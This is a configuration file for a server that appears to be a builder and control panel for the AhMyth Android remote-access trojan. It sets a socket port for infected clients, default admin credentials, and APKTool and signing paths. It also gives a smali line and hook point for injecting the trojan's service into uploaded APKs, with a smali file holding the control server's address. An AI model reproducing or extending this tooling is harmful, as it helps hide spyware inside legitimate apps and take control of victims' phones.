import dotenv from 'dotenv';
import { cleanEnv, num, str } from 'envalid';
import { join } from 'path';

dotenv.config();

process.env.NODE_ENV = process.env.NODE_ENV ?? 'development';

export const config = cleanEnv(process.env, {
    NODE_ENV: str({
        choices: ['development', 'production'],
        default: 'development',
        desc: 'The environment to run the server in.',
    }),
    HTTP_PORT: num({
        default: 80,
        devDefault: 3000,
        desc: 'The port to run server without HTTPS.',
    }),
    HTTPS_PORT: num({
        default: 443,
        devDefault: 3001,
        desc: 'The port to run server with HTTPS. Only used when HTTPS_KEY and HTTPS_CERT are set.',
    }),
    HTTPS_KEY: str({
        default: '',
        desc: 'The path to the HTTPS key.',
    }),
    HTTPS_CERT: str({
        default: '',
        desc: 'The path to the HTTPS certificate.',
    }),
    LOG_LEVEL: str({
        default: 'info',
        devDefault: 'verbose',
        desc: 'The log level to use.',
    }),
    AUTH_USERNAME: str({
        default: 'admin',
        desc: 'The username to use for authentication.',
    }),
    AUTH_PASSWORD: str({
        devDefault: 'admin',
        desc: 'The password to use for authentication.',
    }),
    SQLITE_FILE: str({
        default: 'database.sqlite',
        desc: 'The path to the SQLite database file.',
    }),
    SOCKET_PORT: num({
        default: 42474,
        desc: 'The port to run the socket server on.',
    }),
    SOCKET_MAX_HTTP_BUFFER_SIZE: str({
        default: '100mb',
        desc: 'The maximum size of the HTTP buffer.',
        example: '100mb, 1gb, 2kb, 3b',
    }),
    SOCKET_PING_INTERVAL: str({
        default: '10s',
        desc: 'How often to ping the clients.',
        example: '10s, 1m, 2h',
    }),
    SOCKET_PING_TIMEOUT: str({
        default: '10s',
        desc: 'How long to wait for a ping response.',
        example: '10s, 1m, 2h',
    }),
    APK_DOWNLOAD_PREFIX: str({
        default: 'Ahmyth',
        desc: 'The file name prefix of the downloaded APK file.',
    }),
    APK_UPLOAD_PATH: str({
        default: 'apk/uploads',
        desc: 'The path to store uploaded APK files.',
    }),
    APK_OUTPUT_PATH: str({
        default: 'apk/outputs',
        desc: 'The path to store generated APK files.',
    }),
    APK_EXTRACTED_PATH: str({
        default: 'extracted_apk',
        desc: 'The path of file extracted using APKTool.',
    }),
    APK_TOOL_PATH: str({
        default: './tools/apktool.jar',
        desc: 'The path of APKTool.',
    }),
    SIGN_APK_PATH: str({
        default: './tools/signapk.jar',
        desc: 'The path of signapk.jar.',
    }),
    APK_MAIN_SERVICE: str({
        default: 'ahmyth.mine.king.ahmyth.MainService',
        desc: 'The name of the main service.',
    }),
    APK_MAIN_RECEIVER: str({
        default: 'ahmyth.mine.king.ahmyth.MainReceiver',
        desc: 'The name of the main receiver.',
    }),
    APK_SMALI_SOCKET_PATH: str({
        default: join('smali', 'ahmyth', 'mine', 'king', 'ahmyth', 'e.smali'),
        desc: 'The path of the smali file which contains the IP and port of the server.',
    }),
    APK_SMALI_SERVICE_INJECT: str({
        default:
            'invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->start()V\n\n    return-void',
        desc: 'The smali code to inject into the MainService for activity binding method.',
    }),
    APK_SMALI_SERVICE_HOOK_POINT: str({
        default: 'return-void',
        desc: 'The smali code before which the service code will be injected.',
    }),
});
